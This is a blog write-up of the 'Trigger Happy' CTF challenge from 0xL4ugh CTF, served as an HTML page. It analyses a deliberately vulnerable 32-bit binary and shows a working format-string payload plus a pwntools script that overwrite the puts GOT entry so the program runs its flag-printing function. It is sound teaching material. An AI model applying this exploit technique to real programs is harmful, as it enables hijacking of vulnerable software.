@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Some background This is a challenge from 0xl4ugh CTF which was inspired by RACTF&amp;rsquo;s not really ai challenge, It was the first ever pwn challenge I solve in a CTF alone and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It&amp;rsquo;s pretty awesome to look back and see how much did we grow)." />
+<meta name="keywords" content=", untagged" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://hegz.me/writeups/trigger_happy/" />
+
+
+    <title>
+        
+            Trigger Happy (0xL4ugh CTF) :: Yusuf Hegazy  — blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Trigger Happy (0xL4ugh CTF)">
+<meta itemprop="description" content="Some background This is a challenge from 0xl4ugh CTF which was inspired by RACTF&rsquo;s not really ai challenge, It was the first ever pwn challenge I solve in a CTF alone and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It&rsquo;s pretty awesome to look back and see how much did we grow).">
+<meta itemprop="datePublished" content="2021-01-16T16:33:49+02:00" />
+<meta itemprop="dateModified" content="2021-01-16T16:33:49+02:00" />
+<meta itemprop="wordCount" content="1386">
+<meta itemprop="image" content="https://hegz.me/"/>
+
+
+
+<meta itemprop="keywords" content="untagged," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hegz.me/"/>
+
+<meta name="twitter:title" content="Trigger Happy (0xL4ugh CTF)"/>
+<meta name="twitter:description" content="Some background This is a challenge from 0xl4ugh CTF which was inspired by RACTF&rsquo;s not really ai challenge, It was the first ever pwn challenge I solve in a CTF alone and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It&rsquo;s pretty awesome to look back and see how much did we grow)."/>
+
+
+
+    <meta property="og:title" content="Trigger Happy (0xL4ugh CTF)" />
+<meta property="og:description" content="Some background This is a challenge from 0xl4ugh CTF which was inspired by RACTF&rsquo;s not really ai challenge, It was the first ever pwn challenge I solve in a CTF alone and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It&rsquo;s pretty awesome to look back and see how much did we grow)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hegz.me/writeups/trigger_happy/" />
+<meta property="og:image" content="https://hegz.me/"/>
+<meta property="article:published_time" content="2021-01-16T16:33:49+02:00" />
+<meta property="article:modified_time" content="2021-01-16T16:33:49+02:00" /><meta property="og:site_name" content="Yusuf Hegazy" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-01-16 16:33:49 &#43;0200 EET" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#00FF00;
+                   animation-duration:1.2s;">
+            </span>
+        
+    </div>
+</a>
+
+        
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-184239437-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://hegz.me/posts">Blog</a></li><li><a href="https://hegz.me/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://hegz.me/writeups/trigger_happy/">Trigger Happy (0xL4ugh CTF)</a></h2>
+
+            
+
+            
+
+            <div class="post-content">
+                <h2 id="some-background">Some background</h2>
+<p>This is a challenge from 0xl4ugh CTF which was inspired by RACTF&rsquo;s not really ai challenge, It was the first ever pwn challenge I solve in a CTF alone and I really liked it hence I wanted to bring it to this CTF (you can even check my poorly written writeup for that challenge which I refuse to remove as It&rsquo;s pretty awesome to look back and see how much did we grow).</p>
+<p>You can check my video on format string vulnerabilies as a refresher for these types of attacks.
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/EqeRGqnaoi4" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+</p>
+<hr>
+<h2 id="initial-static-analysis">Initial Static Analysis</h2>
+<p>We start by analyzing the bianry and checking the protections</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ file trigger_happy
+trigger_happy: ELF 32-bit LSB executable, Intel 80386, version <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>SYSV<span style="color:#f92672">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID<span style="color:#f92672">[</span>sha1<span style="color:#f92672">]=</span>de726633c6d3ec5839065e67784dcfdb3497b074, <span style="color:#66d9ef">for</span> GNU/Linux 3.2.0, not stripped
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gdb trigger_happy
+gef➤  checksec
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> checksec <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;/home/vagrant/ctf/0xl4ugh/trigger_happy&#39;</span>
+Canary                        : ✘
+NX                            : ✘
+PIE                           : ✘
+Fortify                       : ✘
+RelRO                         : Partial
+</code></pre></div><p>Seems like we are dealing with 32 bit <strong>not stripped</strong> ELF bianry.</p>
+<h2 id="initial-dynamic-analysis">Initial Dynamic Analysis</h2>
+<p>On running the binary, it&rsquo;s gonna ask for input and then print it out for us.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./trigger_happy
+Do you like 0xL4ugh CTF?
+AAAABBBBCCCCDDDD
+I am glad you
+AAAABBBBCCCCDDDD
+
+We wish you luck!
+</code></pre></div><p>Seems suspecious, let&rsquo;s try %x as input and see what do we get.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./trigger_happy
+Do you like 0xL4ugh CTF?
+%x %x %x
+I am glad you
+<span style="color:#ae81ff">200</span> f7f52540 80491d1
+
+We wish you luck!
+</code></pre></div><p>Voila, seems like we found a format string vulnerable pivot which we can use to leak stack values or even write to pointers on the stack.
+We can further confirm our assumptions by checking the disassembly of our binary for a printf() call with only one argument, but we are going to skip this step.</p>
+<p>One more thing we are going to do is locating the index of the stack entry we control with the printf function, a simple way to do this is by placing an egg and following it with a couple of %x&rsquo;s until we can see our egg in the leaked address and then we can get its index.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./trigger_happy
+Do you like 0xL4ugh CTF?
+AAAA %x %x %x %x %x %x %x %x 
+I am glad you
+AAAA <span style="color:#ae81ff">200</span> f7fbb540 80491d1 <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">20782520</span> <span style="color:#ae81ff">25207825</span> <span style="color:#ae81ff">78252078</span> <span style="color:#ae81ff">20782520</span>
+
+We wish you luck!
+</code></pre></div><p>We can see the hex value for our egg (AAAA) at the 4th entry on the stack.</p>
+<h2 id="more-static-analysis">More Static Analysis</h2>
+<p>I always love to start the analysis by listing the current function in the binary using gdb, and happily our binary isn&rsquo;t stripped.</p>
+<pre><code>gef➤  info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08049000  _init
+0x08049030  printf@plt
+0x08049040  fgets@plt
+0x08049050  getegid@plt
+0x08049060  puts@plt
+0x08049070  system@plt
+0x08049080  __libc_start_main@plt
+0x08049090  setvbuf@plt
+0x080490a0  setresgid@plt
+0x080490b0  _start
+0x080490f0  _dl_relocate_static_pie
+0x08049100  __x86.get_pc_thunk.bx
+0x08049110  deregister_tm_clones
+0x08049150  register_tm_clones
+0x08049190  __do_global_dtors_aux
+0x080491c0  frame_dummy
+0x080491c2  response
+0x08049245  flaggy
+0x08049270  main
+0x080492eb  __x86.get_pc_thunk.ax
+0x080492f0  __libc_csu_init
+0x08049350  __libc_csu_fini
+0x08049351  __x86.get_pc_thunk.bp
+0x08049358  _fini
+</code></pre><p>The only function which seems suspecious is &ldquo;flaggy&rdquo; which kinda sounds like &ldquo;flag&rdquo;?
+Let&rsquo;s disassmble it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">$ disas flaggy
+Dump of assembler code for function flaggy:
+   0x08049245 <span style="color:#960050;background-color:#1e0010">&lt;</span>+0&gt;:     push   ebp
+   0x08049246 <span style="color:#960050;background-color:#1e0010">&lt;</span>+1&gt;:     mov    ebp,esp
+   0x08049248 <span style="color:#960050;background-color:#1e0010">&lt;</span>+3&gt;:     push   ebx
+   0x08049249 <span style="color:#960050;background-color:#1e0010">&lt;</span>+4&gt;:     sub    esp,0x4
+   0x0804924c <span style="color:#960050;background-color:#1e0010">&lt;</span>+7&gt;:     call   0x80492eb &lt;<span style="color:#f92672">__x86.get_pc_thunk.ax</span>&gt;
+   0x08049251 <span style="color:#960050;background-color:#1e0010">&lt;</span>+12&gt;:    add    eax,0x2daf
+   0x08049256 <span style="color:#960050;background-color:#1e0010">&lt;</span>+17&gt;:    sub    esp,0xc
+   0x08049259 <span style="color:#960050;background-color:#1e0010">&lt;</span>+20&gt;:    lea    edx,[eax-0x1fb6]
+   0x0804925f <span style="color:#960050;background-color:#1e0010">&lt;</span>+26&gt;:    push   edx
+   0x08049260 <span style="color:#960050;background-color:#1e0010">&lt;</span>+27&gt;:    mov    ebx,eax
+   0x08049262 <span style="color:#960050;background-color:#1e0010">&lt;</span>+29&gt;:    call   0x8049070 &lt;<span style="color:#f92672">system</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">plt</span>&gt;
+   0x08049267 <span style="color:#960050;background-color:#1e0010">&lt;</span>+34&gt;:    add    esp,0x10
+   0x0804926a <span style="color:#960050;background-color:#1e0010">&lt;</span>+37&gt;:    nop
+   0x0804926b <span style="color:#960050;background-color:#1e0010">&lt;</span>+38&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x0804926e <span style="color:#960050;background-color:#1e0010">&lt;</span>+41&gt;:    leave
+   0x0804926f <span style="color:#960050;background-color:#1e0010">&lt;</span>+42&gt;:    ret
+End of assembler dump.
+</code></pre></div><p>It seems like it&rsquo;s executing a command stored in the edx pointer (since edx is pushed to the stack before the system() call)  but we aren&rsquo;t sure what exactly, but we can do a little trick to inspect what exactly is getting called.</p>
+<p>We modify our eip to the start of the function flaggy.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  set $eip<span style="color:#f92672">=</span>0x08049245
+</code></pre></div><p>Then we can step a couple of instructions or set a breakpoint so we can get to the <code>push edx</code> instruction.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  x/s $edx
+0x804a04a:      <span style="color:#e6db74">&#34;cat flag.txt&#34;</span>
+</code></pre></div><p>Yep it is actually trying to cat our flag!</p>
+<p>On checking the main() function we see that it just sets the buffers and jumps to some other function named response() which takes our input and prints it out using the vulnerable printf as we have just seen.</p>
+<p>Here is the disassembly for reference.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">gef➤  disas response 
+Dump of assembler code for function response:
+   0x080491c2 <span style="color:#960050;background-color:#1e0010">&lt;</span>+0&gt;:     push   ebp
+   0x080491c3 <span style="color:#960050;background-color:#1e0010">&lt;</span>+1&gt;:     mov    ebp,esp
+   0x080491c5 <span style="color:#960050;background-color:#1e0010">&lt;</span>+3&gt;:     push   ebx
+   0x080491c6 <span style="color:#960050;background-color:#1e0010">&lt;</span>+4&gt;:     sub    esp,0x204
+   0x080491cc <span style="color:#960050;background-color:#1e0010">&lt;</span>+10&gt;:    call   0x8049100 &lt;<span style="color:#f92672">__x86.get_pc_thunk.bx</span>&gt;
+   0x080491d1 <span style="color:#960050;background-color:#1e0010">&lt;</span>+15&gt;:    add    ebx,0x2e2f
+   0x080491d7 <span style="color:#960050;background-color:#1e0010">&lt;</span>+21&gt;:    sub    esp,0xc
+   0x080491da <span style="color:#960050;background-color:#1e0010">&lt;</span>+24&gt;:    lea    eax,[ebx-0x1ff8]
+   0x080491e0 <span style="color:#960050;background-color:#1e0010">&lt;</span>+30&gt;:    push   eax
+   0x080491e1 <span style="color:#960050;background-color:#1e0010">&lt;</span>+31&gt;:    call   0x8049060 &lt;<span style="color:#f92672">puts</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">plt</span>&gt;
+   0x080491e6 <span style="color:#960050;background-color:#1e0010">&lt;</span>+36&gt;:    add    esp,0x10
+   0x080491e9 <span style="color:#960050;background-color:#1e0010">&lt;</span>+39&gt;:    mov    eax,DWORD PTR [ebx-0x8]
+   0x080491ef <span style="color:#960050;background-color:#1e0010">&lt;</span>+45&gt;:    mov    eax,DWORD PTR [eax]
+   0x080491f1 <span style="color:#960050;background-color:#1e0010">&lt;</span>+47&gt;:    sub    esp,0x4
+   0x080491f4 <span style="color:#960050;background-color:#1e0010">&lt;</span>+50&gt;:    push   eax
+   0x080491f5 <span style="color:#960050;background-color:#1e0010">&lt;</span>+51&gt;:    push   0x200
+   0x080491fa <span style="color:#960050;background-color:#1e0010">&lt;</span>+56&gt;:    lea    eax,[ebp-0x208]
+   0x08049200 <span style="color:#960050;background-color:#1e0010">&lt;</span>+62&gt;:    push   eax
+   0x08049201 <span style="color:#960050;background-color:#1e0010">&lt;</span>+63&gt;:    call   0x8049040 &lt;<span style="color:#f92672">fgets</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">plt</span>&gt;
+   0x08049206 <span style="color:#960050;background-color:#1e0010">&lt;</span>+68&gt;:    add    esp,0x10
+   0x08049209 <span style="color:#960050;background-color:#1e0010">&lt;</span>+71&gt;:    sub    esp,0xc
+   0x0804920c <span style="color:#960050;background-color:#1e0010">&lt;</span>+74&gt;:    lea    eax,[ebx-0x1fdd]
+   0x08049212 <span style="color:#960050;background-color:#1e0010">&lt;</span>+80&gt;:    push   eax
+   0x08049213 <span style="color:#960050;background-color:#1e0010">&lt;</span>+81&gt;:    call   0x8049060 &lt;<span style="color:#f92672">puts</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">plt</span>&gt;
+   0x08049218 <span style="color:#960050;background-color:#1e0010">&lt;</span>+86&gt;:    add    esp,0x10
+   0x0804921b <span style="color:#960050;background-color:#1e0010">&lt;</span>+89&gt;:    sub    esp,0xc
+   0x0804921e <span style="color:#960050;background-color:#1e0010">&lt;</span>+92&gt;:    lea    eax,[ebp-0x208]
+   0x08049224 <span style="color:#960050;background-color:#1e0010">&lt;</span>+98&gt;:    push   eax
+   0x08049225 <span style="color:#960050;background-color:#1e0010">&lt;</span>+99&gt;:    call   0x8049030 &lt;<span style="color:#f92672">printf</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">plt</span>&gt;
+   0x0804922a <span style="color:#960050;background-color:#1e0010">&lt;</span>+104&gt;:   add    esp,0x10
+   0x0804922d <span style="color:#960050;background-color:#1e0010">&lt;</span>+107&gt;:   sub    esp,0xc
+   0x08049230 <span style="color:#960050;background-color:#1e0010">&lt;</span>+110&gt;:   lea    eax,[ebx-0x1fcf]
+   0x08049236 <span style="color:#960050;background-color:#1e0010">&lt;</span>+116&gt;:   push   eax
+   0x08049237 <span style="color:#960050;background-color:#1e0010">&lt;</span>+117&gt;:   call   0x8049060 &lt;<span style="color:#f92672">puts</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">plt</span>&gt;
+   0x0804923c <span style="color:#960050;background-color:#1e0010">&lt;</span>+122&gt;:   add    esp,0x10
+   0x0804923f <span style="color:#960050;background-color:#1e0010">&lt;</span>+125&gt;:   nop
+   0x08049240 <span style="color:#960050;background-color:#1e0010">&lt;</span>+126&gt;:   mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049243 <span style="color:#960050;background-color:#1e0010">&lt;</span>+129&gt;:   leave
+   0x08049244 <span style="color:#960050;background-color:#1e0010">&lt;</span>+130&gt;:   ret
+End of assembler dump.
+</code></pre></div><h2 id="exploitation">Exploitation</h2>
+<h3 id="plan">Plan</h3>
+<p>Since we have a format string vulnerability, we can control the flow of our binary by altering any pointer we supply to the stack.</p>
+<p>We also do have a target function which we want to call in order to cat our flag (flaggy).</p>
+<p>seems like everything is now connected! we can overwrite any libc call in our response() function with just the flaggy function.</p>
+<p>A good candidate is puts! Let&rsquo;s find it&rsquo;s GOT address in gdb.</p>
+<pre><code>gef➤  got puts
+
+GOT protection: Partial RelRO | GOT functions: 8
+ 
+[0x804c018] puts@GLIBC_2.0  →  0xf7e3e380
+</code></pre><p>So our puts address in the global offset table is <code>0x804c018</code> which is actually a pointer to the actual libc puts.</p>
+<p>Now its time to get the address of the function we are overwriting the puts pointer with.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">gef➤  x flaggy
+0x8049245 &lt;<span style="color:#f92672">flaggy</span>&gt;:     0x53e58955
+</code></pre></div><p>The address of flaggy is <code>0x8049245</code>.</p>
+<p>Now we have everything we need and it&rsquo;s time to craft our exploit!</p>
+<h3 id="crafting-the-exploit">Crafting the exploit</h3>
+<h4 id="1-doing-it-the-hard-way">1. Doing it the hard way</h4>
+<p>Let&rsquo;s start with crafting our exploit without using any scripts or fancy tools.
+Here is the info we have gathered so far.</p>
+<ol>
+<li>printf entry that we control is at index <strong>4</strong></li>
+<li>puts pointer address: <strong><code>0x804c018z</code></strong></li>
+<li>flaggy function address: <strong><code>0x8049245</code></strong></li>
+</ol>
+<p>our payload will be as follows:</p>
+<p><code>pointer</code> <code>data to be written</code> <code>the write specifier</code></p>
+<p>which is equivalent to the following:</p>
+<p><code>0x804c018</code> <code>%(0x8049245 - 4)x</code> <code>%4$n</code></p>
+<p>convert puts address to little endian and equate the integer value of (0x8049245 - 4)</p>
+<pre><code>\x18\xc0\x04\x08 %134517313x %4$n
+</code></pre><p>but on using this payload we literally write 134517313 blank characters to stdout which is going to take ~2 mins everytime we are trying to execute the payload.</p>
+<p>This makes it pretty damn hard to test and debug our payload, but the good news is we can use an alternate faster method using short writes (2-bytes write) instead of an integer write (4-byte write).</p>
+<p>Instead of directly writing to the puts pointer <code>0x804c018</code> we can write two bytes <code>0x804</code> to the upper nibbe of the pointer <code>0x804c018 + 2</code> and another two bytes <code>0x9245</code> to the lower nibble of the pointer <code>0x804c018</code>.</p>
+<p>Don&rsquo;t forget that we need to <strong>subtract</strong> the amount of charcters written so far from each write we do.</p>
+<p>Here is the payload:</p>
+<p><code>0x804c018+2</code> <code>0x804c018</code> <code>%(0x804-8)x</code> <code>%4$n</code> <code>%(0x9245-0x804)x</code> <code>%5$n</code></p>
+<p>We will convert the first two addresses to little endian and the second two addresses to their integer equivalent.</p>
+<p><code>\x1a\xc0\x04\x08</code> <code>\x18\xc0\x04\x08</code> <code>%2044x</code> <code>%4$hn</code> <code>%35393x</code> <code>%5$hn</code></p>
+<p>And we can use echo with the -e flag to pass it to our binary escaping the &ldquo;$&rdquo; using a forward slash.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo -e <span style="color:#e6db74">&#34;\x1a\xc0\x04\x08\x18\xc0\x04\x08%2044x%4\$hn%35393x%5\$hn&#34;</span> | ./trigger_happy
+</code></pre></div><p>And we get our flag!</p>
+<h4 id="2-using-pwntools-to-craft-our-exploit">2. Using pwntools to craft our exploit.</h4>
+<p>Here is how I built the same exploit using python and pwntools.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./trigger_happy&#39;</span>)
+
+<span style="color:#66d9ef">if</span> args[<span style="color:#e6db74">&#39;REMOTE&#39;</span>]:
+    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;ctf.0xl4ugh.com&#39;</span>, <span style="color:#ae81ff">1337</span>)
+<span style="color:#66d9ef">else</span>:
+    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./trigger_happy&#39;</span>)
+
+puts <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]
+win <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;flaggy&#39;</span>]
+payload <span style="color:#f92672">=</span> fmtstr_payload(OFFSET, {puts: win}, write_size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;byte&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>():
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>readlineS())
+    io<span style="color:#f92672">.</span>sendline(payload)
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvallS())
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    run()
+</code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://hegz.me/tags/untagged/">untagged</a></span>
+        
+    </p>
+
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            
+            <span> <a href="https://hegz.me/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+          </div>
+    </div>
+<script type="text/javascript" async
+  src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+  });
+  MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+
+  MathJax.Hub.Config({
+  
+  TeX: { equationNumbers: { autoNumber: "AMS" } }
+  });
+</script>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-184239437-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+    </body>
+</html>
